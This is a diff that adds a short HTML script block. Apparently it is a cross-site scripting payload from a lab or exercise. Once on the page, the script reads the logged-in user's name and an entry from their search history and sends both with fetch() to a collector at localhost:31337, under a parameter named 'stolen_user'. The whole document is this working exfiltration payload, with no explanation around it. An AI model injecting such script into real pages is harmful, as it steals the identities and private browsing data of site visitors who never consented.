@@ -1,0 +1,11 @@
+<script>
+  setTimeout(() =>
+    fetch(
+      `http://localhost:31337/?stolen_user=${$(
+        "#logged-in-user"
+      ).text()}&last_search=${encodeURIComponent(
+        $("#history-list").children(":nth-child(2)").text()
+      )}`
+    )
+  );
+</script>
